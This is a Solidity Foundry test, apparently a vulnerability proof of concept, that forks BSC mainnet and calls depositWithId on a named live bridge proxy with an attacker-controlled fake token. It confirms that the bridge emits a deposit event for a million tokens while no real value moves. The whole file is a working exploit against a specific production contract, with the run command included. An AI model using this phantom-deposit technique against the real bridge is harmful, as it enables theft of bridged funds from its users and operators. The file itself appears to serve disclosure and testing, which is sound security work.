// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {FakeToken} from "../src/FakeToken.sol";

interface IDepositWithId {
    function depositWithId(address token, uint256 amount, uint256 commitmentId) external;
}

/**
 * PoC — step 6 against the LIVE, deployed BSC bridge (not a local copy).
 *
 * Forks BSC mainnet and calls depositWithId on the real proxy
 * 0xB80A582fa430645A043bB4f6135321ee01005fEf, whose implementation bytecode is
 * whatever Rhino actually has deployed today. Proves the phantom deposit works
 * against production code + production state.
 *
 * Run: BSC_RPC_URL=https://bsc-dataseed.bnbchain.org forge test \
 *        --match-path test/PhantomDepositFork.t.sol -vv
 */
contract PhantomDepositForkTest is Test {
    event BridgedDepositWithId(
        address sender, address origin, address token, uint256 amount, uint256 commitmentId
    );

    address internal constant LIVE_BRIDGE = 0xB80A582fa430645A043bB4f6135321ee01005fEf;

    address internal attacker = makeAddr("attacker");
    uint256 internal constant PHANTOM_AMOUNT = 1_000_000 ether;
    uint256 internal constant COMMITMENT_ID = 42;

    function test_phantomDeposit_againstLiveBscContract() public {
        // skip cleanly if no RPC configured
        try vm.envString("BSC_RPC_URL") returns (string memory url) {
            vm.createSelectFork(url);
        } catch {
            emit log_string("SKIP: set BSC_RPC_URL to run the live-fork PoC");
            return;
        }

        // sanity: we are talking to a real contract with code
        assertGt(LIVE_BRIDGE.code.length, 0, "live bridge has bytecode");

        FakeToken fake = new FakeToken();
        uint256 bridgeBalBefore = fake.balanceOf(LIVE_BRIDGE);

        vm.prank(attacker, attacker);
        vm.expectEmit(true, true, true, true, LIVE_BRIDGE);
        emit BridgedDepositWithId(attacker, attacker, address(fake), PHANTOM_AMOUNT, COMMITMENT_ID);

        IDepositWithId(LIVE_BRIDGE).depositWithId(address(fake), PHANTOM_AMOUNT, COMMITMENT_ID);

        assertEq(fake.transferFromCalls(), 1, "live bridge invoked transferFrom");
        assertEq(fake.lastTo(), LIVE_BRIDGE, "pull target was the live bridge");
        assertEq(fake.balanceOf(LIVE_BRIDGE), bridgeBalBefore, "live bridge received 0 real value");

        emit log_string("STEP 6 CONFIRMED ON LIVE BSC: phantom BridgedDepositWithId emitted, 0 value moved");
    }
}
